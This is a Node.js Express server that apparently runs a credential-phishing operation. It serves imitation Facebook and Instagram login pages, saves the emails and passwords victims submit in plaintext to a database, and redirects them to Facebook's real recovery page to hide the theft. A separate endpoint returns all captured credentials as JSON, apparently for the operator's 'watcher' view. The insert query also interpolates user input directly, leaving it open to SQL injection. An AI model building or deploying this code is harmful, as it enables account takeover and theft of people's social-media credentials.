const express = require('express');
const app = express();
const path = require('path');

const db = require('../models/db');
const port = 3000;

app.use(express.urlencoded());
app.use(express.static(path.join(__dirname, '../public')));

app.get('/api', async function (req, res) {
  try {
    const result = await db.query('SELECT * FROM users');
    res.json({ message: 200, data: result.rows });
  } catch (err) {
    console.error(err);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/api/list-data', function (req, res) {
  res.sendFile(path.join(__dirname, '../public/watcher/index.html'));
});

app.get('/facebook/login', function (req, res) {
  res.sendFile(path.join(__dirname, '../public/facebook/index.html'));
});

app.post('/facebook/login', async function (req, res) {
  try {
    const { email, password, social_media } = req.body;
    await db.query(`INSERT INTO users (email, password, social_media) VALUES ('${email}', '${password}', '${social_media}')`);
  } catch (err) {
    console.error(err);
    res.status(500).send('Internal Server Error');
  }
  res.redirect('https://facebook.com/recover/initiate/');
});

app.get('/instagram/login', function (req, res) {
  res.sendFile(path.join(__dirname, '../public/instagram/index.html'));
});

app.listen(port, () => {
  console.log(`Listening on ${port}`);
});
